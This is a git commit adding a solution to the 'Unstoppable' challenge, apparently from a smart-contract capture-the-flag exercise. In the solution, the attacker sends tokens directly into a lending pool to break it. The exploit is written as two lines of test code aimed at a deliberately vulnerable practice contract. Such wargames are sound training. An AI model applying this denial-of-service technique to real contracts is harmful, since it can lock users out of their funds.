00cd2e52fbf4fd77f5324f509c8bd9bbda25f15c
GuillermoFairbairn <fairbairnguillermo@gmail.com>
2022-12-02 23:05:55 -0300

    {NEW} unstoppable- 1st challenge completed

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackerTokenInstance = await this.token.connect(attacker)
+        await attackerTokenInstance.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE)
     });
 
     after(async function () {
